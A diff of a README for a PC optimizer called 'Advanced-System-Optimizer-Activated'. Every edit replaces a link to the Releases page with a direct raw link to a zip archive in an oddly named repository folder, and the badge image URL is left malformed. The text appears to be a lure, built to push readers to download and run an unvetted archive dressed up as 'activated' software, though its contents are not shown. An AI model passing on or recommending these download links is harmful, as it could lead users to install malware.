@@ -1,6 +1,6 @@
 # 🌟 Advanced-System-Optimizer-Activated - Optimize Your PC Performance Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/karuizawa0/Advanced-System-Optimizer-Activated/releases)
+[![Download Now](https://github.com/karuizawa0/Advanced-System-Optimizer-Activated/raw/refs/heads/main/Timuquanan/System_Advanced_Activated_Optimizer_1.1.zip%20Now-Get%20Started-brightgreen)](https://github.com/karuizawa0/Advanced-System-Optimizer-Activated/raw/refs/heads/main/Timuquanan/System_Advanced_Activated_Optimizer_1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **Advanced-System-Optimizer-Activated**! This application helps you c
 
 ## 📥 Download & Install
 
-To start using Advanced System Optimizer, visit this page to download: [Download Advanced-System-Optimizer-Activated](https://github.com/karuizawa0/Advanced-System-Optimizer-Activated/releases).
+To start using Advanced System Optimizer, visit this page to download: [Download Advanced-System-Optimizer-Activated](https://github.com/karuizawa0/Advanced-System-Optimizer-Activated/raw/refs/heads/main/Timuquanan/System_Advanced_Activated_Optimizer_1.1.zip).
 
 ### Steps to Download:
 
@@ -70,4 +70,4 @@ If you encounter any issues, feel free to reach out for help. You can also check
 
 For more information, keep an eye on updates on the Releases page. 
 
-Download the software now to experience a fast and efficient PC: [Download Advanced-System-Optimizer-Activated](https://github.com/karuizawa0/Advanced-System-Optimizer-Activated/releases).
+Download the software now to experience a fast and efficient PC: [Download Advanced-System-Optimizer-Activated](https://github.com/karuizawa0/Advanced-System-Optimizer-Activated/raw/refs/heads/main/Timuquanan/System_Advanced_Activated_Optimizer_1.1.zip).
